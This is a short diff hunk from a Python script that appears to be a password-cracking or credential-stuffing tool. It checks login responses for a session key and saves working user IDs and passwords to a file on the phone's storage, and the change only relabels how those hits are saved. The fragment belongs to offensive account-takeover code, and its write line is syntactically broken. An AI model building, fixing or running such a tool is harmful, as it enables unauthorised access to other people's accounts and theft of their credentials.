@@ -212,7 +212,7 @@ def file_subb(uid,pwx):
             q=json.loads(p)
             if "session_key" in q:
                 print(f"\r\r\033[0;36m  [OK] {uid} : {ps}")
-                open("/sdcard/goxdies.txt","a+").write("[CE]" uid+" : "+ps+"\n")
+                open("/sdcard/goxdies.txt","a+").write("[OK]" uid+" : "+ps+"\n")
                 oks.append(uid)
                 break
             elif "Please Confirm Email" in q:
